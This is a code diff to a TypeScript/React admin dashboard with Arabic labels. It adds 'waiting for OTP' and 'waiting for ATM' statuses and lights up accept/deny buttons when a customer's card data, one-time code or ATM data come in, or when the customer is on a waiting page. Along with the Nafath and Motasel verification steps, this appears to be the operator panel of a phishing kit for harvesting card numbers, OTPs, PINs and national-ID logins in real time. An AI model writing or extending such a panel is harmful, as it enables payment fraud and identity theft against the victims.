@@ -63,7 +63,9 @@ type Payment = {
 
 const STATUS_LABELS: Record<string, { label: string; color: string; bg: string; border: string }> = {
   new:              { label: "جديد",          color: "#0d6efd", bg: "#e7f0ff", border: "#b6d0ff" },
-  pending_payment:  { label: "انتظار دفع",    color: "#856404", bg: "#fff3cd", border: "#ffd966" },
+  pending_payment:  { label: "انتظار بطاقة",  color: "#856404", bg: "#fff3cd", border: "#ffd966" },
+  pending_otp:      { label: "انتظار OTP",   color: "#7c3aed", bg: "#f5f3ff", border: "#ddd6fe" },
+  pending_atm:      { label: "انتظار ATM",   color: "#ea580c", bg: "#fff7ed", border: "#fed7aa" },
   pending_nafath:   { label: "انتظار نفاذ",   color: "#6f42c1", bg: "#f0e9ff", border: "#c9b8f0" },
   pending_motasel:  { label: "انتظار متصل",   color: "#d63384", bg: "#ffe5f0", border: "#f5b8d5" },
   payment_done:     { label: "تم الدفع",      color: "#146c43", bg: "#d1e7dd", border: "#a3cfbb" },
@@ -161,7 +163,7 @@ function BookingModal({
   }
 
   // هل فيه بيانات جديدة تحتاج قرار؟
-  // الأزرار تضيء عندما paymentAction = "STILL" أو لم يُحدَّد بعد
+  // الأزرار تضيء عندما paymentAction = "STILL" أو لم يُحدَد بعد
   // وتُطفأ عندما paymentAction = "accepted" أو "denied" أو "pass" أو "verified"
   const isInWaiting = currentPage === "bCall" || currentPage === "waiting";
   const actionIsDone = (
@@ -170,8 +172,13 @@ function BookingModal({
     payment.paymentAction === "denied" ||
     payment.paymentAction === "verified"
   );
+  // الأزرار تضيء إذا:
+  // - فيه بيانات بطاقة ولم يتم القرار بعد
+  // - أو فيه OTP ولم يتم القرار بعد
+  // - أو فيه ATM ولم يتم القرار بعد
+  // - أو العميل في صفحة الانتظار
   const hasNewData = (
-    hasCardData && !actionIsDone
+    (hasCardData || hasOtp || hasAtm) && !actionIsDone
   ) || isInWaiting;
 
   // أزرار القبول والرفض - تتفعل فقط لما فيه بيانات
